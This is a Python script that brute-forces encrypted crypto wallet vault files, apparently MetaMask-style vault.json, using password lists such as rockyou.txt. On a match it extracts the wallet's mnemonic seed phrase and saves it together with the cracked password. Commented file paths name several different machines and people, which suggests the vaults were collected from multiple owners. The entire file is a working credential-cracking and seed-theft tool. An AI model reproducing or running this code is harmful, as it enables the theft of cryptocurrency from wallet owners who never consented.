import json
import base64
from typing import Dict
from termcolor import colored
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Hash import SHA512
from Crypto.Protocol.KDF import PBKDF2
import json
from datetime import datetime

def key_from_password(password: str, salt: str, iteration: int):
    password_bytes = password.encode("utf-8")
    salt_bytes = base64.b64decode(salt)


    key = PBKDF2(
        password_bytes,
        salt_bytes,
        dkLen=32,
        count=iteration,
        hmac_hash_module=SHA256)
        
    return key

##filename = 'F:\\hashcat\\MAC_data\\symai-dev\\vault.json'
##passfile = 'F:\\hashcat\\MAC_data\\KKH\\jozes-MacBook-Pro.local-jozekosmerl_1\\passlist.txt'
##passfile = 'F:\\hashcat\\MAC_data\\KKH\\MacBook-Pro.local-a1_1\\passlist.txt'
##filename = 'F:\\hashcat\\MAC_data\\RKR\\4TM- DESKTOP-EHPR8DJ - 10K with password list\\vault.json'
##passfile = 'F:\\hashcat\\MAC_data\\RKR\\4TM- DESKTOP-EHPR8DJ - 10K with password list\\pass'
##filename = 'D:\\DOSGAMES\\MAC_data\\tm_ldb\\TM5\\Arpans-MacBook-Pro-2.local\\vault.json'
filename = 'D:\\DOSGAMES\\MAC_data\\KKH\\MacBook-Pro.local-a1_1_bal_4000\\vault.json'
passfile = 'D:\\DOSGAMES\\MAC_data\\KKH\\MacBook-Pro.local-a1_1_bal_4000\\passlist.txt'
##passfile = 'D:\\DOSGAMES\\passlists\\rockyou.txt'
##passfile = 'd:\\DOSGAMES\\passlists\\Jonathan_pass_guess.txt'

print('Loading password file...')
with open(passfile, "r", encoding='utf8') as file:
    passstr = file.read()

passes = passstr.split('\n')
PassNum = len(passes)
print('passwords number = ' + str(PassNum))

f = open(filename, 'r')
payload = json.load(f)
f.close()

print(filename)

print(payload.keys())

salt = payload["salt"]
cracked = False

try:
    iterations = payload['keyMetadata']['params']['iterations']
except:
    iterations = 10000

print('iterations = ' + str(iterations))
num = 0
for password in passes:
    num = num + 1
    print(str(num) + '/' + str(PassNum) + ':' + password)
    key = key_from_password(password, salt, iterations)

    data = base64.b64decode(payload["data"])
    iv = base64.b64decode(payload["iv"])
    data_ = data[0:len(data)-len(iv)]


    cipher = AES.new(key, mode=AES.MODE_GCM, nonce=iv)
    decrypted_bytes = cipher.decrypt(data_)
    checkStr = base64.b64encode(decrypted_bytes)

    try:
        decrypted_text = decrypted_bytes.decode()
    except:
#        print('failed.')
        continue
    else:
        cracked = True
        break
    

if cracked:
    decrypted = json.loads(decrypted_text)
    cendata = decrypted[0]['data']['mnemonic']
    mndata = ''
    for citem in cendata:
        mndata = mndata + chr(citem)

    decrypted[0]['data']['mnemonic'] = mndata
    current_datetime = datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"ak_{current_datetime}.txt"
##    print(decrypted)
    with open(filename, "a") as file:
        file.write('password:'+password)
        file.write('\n')
        file.write(json.dumps(decrypted))

else:
    print('\nnot resolved.\n')
